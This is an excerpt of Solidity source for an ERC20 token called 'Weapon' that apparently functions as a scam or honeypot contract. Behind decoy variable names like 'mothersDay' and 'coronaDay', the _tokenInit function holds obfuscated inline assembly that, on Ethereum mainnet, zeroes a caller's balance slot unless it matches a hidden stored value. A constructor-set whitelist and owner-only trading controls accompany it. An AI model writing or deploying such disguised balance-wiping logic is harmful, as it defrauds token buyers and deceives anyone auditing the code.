...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    uint256 private mothersDay = block.number*2;

    mapping (address => bool) private _firstMove; 
    mapping (address => bool) private _secondHike;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _chocolateTea;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private spoiledPerson;
    address public pair;
    ...
    bool private trading; uint256 private coronaDay = 1; bool private christmasDay;
    uint256 private _decimals; uint256 private birthDay;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        for (uint256 q=0; q < 3;) {_firstMove[addWeapon[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x92ff26de3fed8e8cf93965d1d53a80779617b8d981ff599ef405593ae298e86a
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xabf5d54d0a4b25fdcc73c28582a3efc6f0e5acf7426e513da2a723ac96a5c0d2,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; mothersDay = block.number;
        return true;
    }
    ...
    function _DeployWeapon(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployWeapon(creator, initialSupply);
    }
}

contract Weapon is ERC20Token {
    constructor() ERC20Token("Weapon", "WEAPON", msg.sender, 25000000 * 10 ** 18) {
    }
}